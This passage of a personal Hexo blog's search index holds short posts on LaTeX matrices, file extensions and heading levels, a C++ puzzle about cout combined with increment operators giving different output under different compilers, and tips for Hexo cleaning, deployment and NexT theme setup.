class="tag">\<span class="name">\</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;bmatrix&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">%  带||,即行列式</span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;vmatrix&#125;</span></span></span><br><span class="line">    1 &amp; 0 &amp; 0<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line">    0 &amp; 1 &amp; 0<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line">    0 &amp; 0 &amp; 1<span class="tag">\<span class="name">\</span></span><span class="tag">\<span class="name">\</span></span></span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;vmatrix&#125;</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LaTeX </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LaTeX基础</title>
      <link href="/2020/08/23/LaTeX%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/08/23/LaTeX%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h4 id="1-LATEX相关文件扩展名与描述"><a href="#1-LATEX相关文件扩展名与描述" class="headerlink" title="1.LATEX相关文件扩展名与描述"></a>1.LATEX相关文件扩展名与描述</h4><div class="table-container"><table><thead><tr><th>扩展名</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td><code>.tex</code></td><td style="text-align:left">TeX 源文档</td></tr><tr><td><code>.sty</code></td><td style="text-align:left">LaTeX 样式文件，使用 <code>\usepackage</code> 命令导入</td></tr><tr><td><code>.dtx</code></td><td style="text-align:left">Documented TeX。LaTeX <code>sty</code> 文档的分发形式</td></tr><tr><td><code>.ins</code></td><td style="text-align:left"><code>.dtx</code> 的安装文件，<code>latex foo.ins</code> 会生成所需的 sty 文档和帮助手册</td></tr><tr><td><code>.cls</code></td><td style="text-align:left">类文档，使用 <code>\documentclass</code> 命令导入</td></tr><tr><td><code>.fd</code></td><td style="text-align:left">字体描述文档</td></tr><tr><td><code>.dvi</code></td><td style="text-align:left">设备无关文件 <code>latex</code> 编译产生</td></tr><tr><td><code>.pdf</code></td><td style="text-align:left">pdf 文档</td></tr><tr><td><code>.log</code></td><td style="text-align:left">编译日志</td></tr><tr><td><code>.toc</code></td><td style="text-align:left">存放章节名称，在下一次编译时读入以产生目录</td></tr><tr><td><code>.lof</code></td><td style="text-align:left">类似于 <code>.toc</code> 产生插图目录</td></tr><tr><td><code>.lot</code></td><td style="text-align:left">产生表格目录</td></tr><tr><td><code>.aux</code></td><td style="text-align:left">存放各种标签引用信息，下次编译时读入以产生交叉参考</td></tr><tr><td><code>.idx</code></td><td style="text-align:left">存放索引词，用 <code>makeindex</code> 处理</td></tr><tr><td><code>.ind</code></td><td style="text-align:left">处理过的 <code>.idx</code>文档，下次编译时读入以产生索引</td></tr><tr><td><code>.ilg</code></td><td style="text-align:left"><code>makeindex</code> 的日志</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> LaTeX </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>A c++ problem</title>
      <link href="/2020/08/17/A-c-problem/"/>
      <url>/2020/08/17/A-c-problem/</url>
      
        <content type="html"><![CDATA[<p> Recently, I thought of a problem I encountered when I first started learning C + + .</p><p>What will happen if  <strong>cout</strong> combine with <strong><em>++</em></strong>  ？</p><p>I tried it and got the following answer.</p><p><img src="/2020/08/17/A-c-problem/1.png" alt></p><p>I expected the output is 3455567 .However,this outputwas completely different from what I had expected.</p><p>Maybe this was because the Code editor. </p><p>I replaced the devcpp  with vs.</p><p>But nothing changed.</p><p>Maybe this was due to  Compiler.</p><p>I ran the codes on mac,now get the answer what i needed.  </p><p><img src="/2020/08/17/A-c-problem/2.png" alt></p><p>And i got the answer.</p><p> In the environment of windows 10 or 7 ,my Compiler was gcc 4.9.2 .and whatever use devc++ or vscode. The answer was same,3455567.</p><p>But,in the environment of Mac ,my Compiler was clang 11.0.3,and vs gave the answer 3455677.</p><p>Maybe the different answer was due to different Compiler.</p><p>But Why? </p><p>I didn’t get some useful message. I hope i can talk about this next time.</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo:Local change and remote server change</title>
      <link href="/2020/08/03/hexo-Local-change-and-remote-server-change/"/>
      <url>/2020/08/03/hexo-Local-change-and-remote-server-change/</url>
      
        <content type="html"><![CDATA[<p>Sometimes，we made some changes in local environment. But when we push our changes to remote server,nothing happened.</p><p>We have to use</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p> <strong><em>hexo clean</em></strong> is used to clear cache file（ db.json ）and generated static files (public). </p><p> In some cases, especially after a theme change, you may need  to run the command if you find that your changes to the site are not  taking effect anyway. </p><p>If you meet some problem and you don’t know how to solve it. Just try</p><p><strong><em>hexo clean</em></strong>.</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>how to build level 3 title in latex</title>
      <link href="/2020/08/02/how-to-build-level-3-title-in-latex/"/>
      <url>/2020/08/02/how-to-build-level-3-title-in-latex/</url>
      
        <content type="html"><![CDATA[<p>We can build  level 3 title by the follow codes</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\section&#123;level 1 title&#125;</span><br><span class="line">\subsection&#123;level 2 title&#125;</span><br><span class="line">\subsection&#123;level 3 title&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/how-to-build-level-3-title-in-latex/1.png" alt></p><p>However,level 3 title is not what we want it show.</p><p>We need to add a command in the introduction area.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\setcounter&#123;secnumdepth&#125;&#123;4&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/how-to-build-level-3-title-in-latex/2.png" alt></p><h4 id="What-about-level-4-or-level-title"><a href="#What-about-level-4-or-level-title" class="headerlink" title="What about level 4 or level title?"></a>What about level 4 or level title?</h4><p>you can using command <strong><em>itemize</em></strong> <strong><em>enumerate</em></strong> <strong><em>description</em></strong> .</p><h6 id="item"><a href="#item" class="headerlink" title="item"></a>item</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\begin&#123;itemize&#125;</span><br><span class="line">\item first        &#x2F;&#x2F;item[*]  will replace point by *.</span><br><span class="line">\item second</span><br><span class="line">\item third</span><br><span class="line">\item forth</span><br><span class="line">\end&#123;itemize&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/how-to-build-level-3-title-in-latex/3.png" alt></p><h5 id="enumerate"><a href="#enumerate" class="headerlink" title="enumerate"></a>enumerate</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\begin&#123;enumerate&#125;[i)]  &#x2F;&#x2F;you can replace i by other parameters(such as 1), and it will show  differently.</span><br><span class="line">\item first</span><br><span class="line">\item second</span><br><span class="line">\item third</span><br><span class="line">\item forth</span><br><span class="line">\end&#123;enumerate&#125;</span><br></pre></td></tr></table></figure><h5 id="description"><a href="#description" class="headerlink" title="description"></a>description</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\begin&#123;description&#125;</span><br><span class="line">\item[item a] first</span><br><span class="line">\item[item b] second</span><br><span class="line">\item[item c] third</span><br><span class="line">\item[item d] forth</span><br><span class="line">\end&#123;description&#125;</span><br></pre></td></tr></table></figure><p>Besides,you can also change the title from by changing the parameters.</p><p>That’s means you can the title what you want.</p>]]></content>
      
      
      <categories>
          
          <category> LaTeX </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Some problems in theme change</title>
      <link href="/2020/07/30/Some-problems-in-theme-change/"/>
      <url>/2020/07/30/Some-problems-in-theme-change/</url>
      
        <content type="html"><![CDATA[<p>按照官方教程在尝试将主题更改为next时遇到问题</p><p>hexo -s后出现如下情形 出现一堆代码</p><p><img src="/2020/07/30/Some-problems-in-theme-change/1.png" alt></p><p>经查 发现是next官网的教程github库长期未更新</p><p>于是删除原先下载的next主题（ <a href="https://github.com/iissnan/hexo-theme-next">https://github.com/iissnan/hexo-theme-next</a> ） </p><p>下载新的next主题（<a href="https://github.com/theme-next/hexo-theme-next">https://github.com/theme-next/hexo-theme-next</a> ）</p><p>在删除原先的next主题中发现权限不够 参考下文</p><p><strong><a href="https://blog.csdn.net/grllery/article/details/80636447">https://blog.csdn.net/grllery/article/details/80636447</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hello hexo</title>
      <link href="/2020/07/30/hello-hexo/"/>
      <url>/2020/07/30/hello-hexo/</url>
      
        <content type="html"><![CDATA[<h3 id="Hello-blog！"><a href="#Hello-blog！" class="headerlink" title="Hello blog！"></a>Hello blog！</h3>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
